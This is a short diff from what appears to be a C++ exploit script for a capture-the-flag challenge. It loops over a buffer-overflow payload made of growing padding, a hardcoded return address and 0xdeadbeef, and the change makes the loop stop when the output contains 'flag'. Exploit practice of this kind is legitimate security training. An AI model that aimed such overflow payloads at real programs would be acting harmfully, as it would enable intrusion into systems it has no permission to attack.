@@ -91,7 +91,7 @@ int main(){
 		cmdout(string(i, 'f') + "\xea\x05\x40" + string(10, '0') + "\xef\xbe\xad\xde");
 		ret = cmdin();
 		killcmd();
-		if(!ret.empty()) break;
+		if(ret.find("flag") != string::npos) break;
 	}
 	
 	cout << ret << endl;
